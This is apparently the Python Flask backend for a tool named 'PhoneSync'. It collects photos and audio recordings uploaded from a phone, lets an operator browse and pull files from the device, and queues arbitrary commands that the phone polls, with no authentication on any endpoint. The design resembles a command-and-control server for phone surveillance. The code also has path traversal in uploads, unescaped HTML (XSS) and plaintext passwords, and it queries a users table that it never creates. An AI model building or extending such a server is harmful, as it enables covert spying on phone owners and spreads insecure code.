from flask import Flask, request, jsonify
import sqlite3
import os
from flask import send_from_directory

requested_file = ""
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app = Flask(__name__)
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        command TEXT
    )
    """)

    conn.commit()
    conn.close()

init_db()
@app.route("/")
def home():
    return "PhoneSync Server Running Successfully!"

@app.route("/register", methods=["POST"])
def register():

    data = request.json

    username = data.get("username")
    email = data.get("email")
    password = data.get("password")

    try:
        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()

        cursor.execute(
            "INSERT INTO users (username, email, password) VALUES (?, ?, ?)",
            (username, email, password)
        )

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": "User Registered Successfully"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        })
@app.route("/login", methods=["POST"])
def login():

    data = request.json

    email = data.get("email")
    password = data.get("password")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT * FROM users WHERE email=? AND password=?",
        (email, password)
    )

    user = cursor.fetchone()
    conn.close()

    if user:
        return jsonify({
            "status": "success",
            "message": "Login Successful"
        })

    return jsonify({
        "status": "error",
        "message": "Invalid Email or Password"
    })
@app.route("/upload", methods=["POST"])
def upload_file():

    if "file" not in request.files:
        return jsonify({
            "status": "error",
            "message": "No file selected"
        })

    file = request.files["file"]

    if file.filename == "":
        return jsonify({
            "status": "error",
            "message": "Empty filename"
        })

    import os
    import time

    filename = file.filename
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)


    return jsonify({
    "status": "success",
    "message": "File uploaded successfully",
    "filename": filename
    })
@app.route('/files')
def list_files():

    photos = []
    audios = []

    for f in os.listdir(UPLOAD_FOLDER):

        path = os.path.join(UPLOAD_FOLDER, f)

        item = {
            "name": f,
            "modified": os.path.getmtime(path)
        }

        if f.endswith(".jpg"):
            photos.append(item)

        elif f.endswith(".m4a"):
            audios.append(item)

    photos.sort(
        key=lambda x: x["modified"],
        reverse=True
    )

    audios.sort(
        key=lambda x: x["modified"],
        reverse=True
    )

    return jsonify({
        "audio_recordings": audios,
        "photos": photos
    })
file_list_data = []

@app.route('/view/<filename>')
def view_file(filename):
    return send_from_directory(
        UPLOAD_FOLDER,
        filename
    )
mobile_files = []

@app.route("/filelist", methods=["POST"])
def filelist():

    global mobile_files

    data = request.form.get("filelist")

    if data:
        import json
        mobile_files = json.loads(data)

    return jsonify({
        "status": "success"
    })

@app.route("/mobile_files")
def mobile_files_list():
    return jsonify(mobile_files)

@app.route("/mobile_files_view")
def mobile_files_view():

    html = """
<html>
<body>
<table border="1">
<tr>
<th>Name</th>
<th>Size</th>
<th>Download</th>
</tr>
"""

    for f in mobile_files:
        html += f"""
        <tr>
            <td>{f['name']}</td>
            <td>{f['size']}</td>

        <td>
            <form action="/request_mobile_file" method="post">

                <input
                    type="hidden"
                    name="path"
                    value="{f['path']}"
                >

                <button type="submit">
                    Download
                </button>

            </form>
        </td>

    </tr>
    """

    html += """
        </table>
    </body>
    </html>
    """
    return html
@app.route("/request_file", methods=["POST"])
def request_file():

    global requested_file

    data = request.json
    requested_file = data.get("path", "")

    return jsonify({
        "status": "success"
    })
@app.route("/get_requested_file")
def get_requested_file():

    global requested_file

    path = requested_file

    requested_file = ""

    return jsonify({
        "path": path
    })


requested_file = ""

@app.route("/request_mobile_file", methods=["POST"])
def request_mobile_file():

    global requested_file

    requested_file = request.form.get("path")

    return f"""
    <h2>File Requested</h2>

    <p>{requested_file}</p>

    <a href="/mobile_files_view">
        Back
    </a>
    """

@app.route("/send_command", methods=["POST"])
def send_command():

    data = request.json
    command = data.get("command")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "INSERT INTO commands (command) VALUES (?)",
        (command,)
    )

    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "command": command
    })
@app.route("/get_command", methods=["GET"])
def get_command():

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT id, command FROM commands ORDER BY id DESC LIMIT 1"
    )

    result = cursor.fetchone()

    if result:

        cursor.execute(
            "DELETE FROM commands WHERE id=?",
            (result[0],)
        )

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "id": result[0],
            "command": result[1]
        })

    conn.close()

    return jsonify({
        "status": "empty",
        "command": ""
    })
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)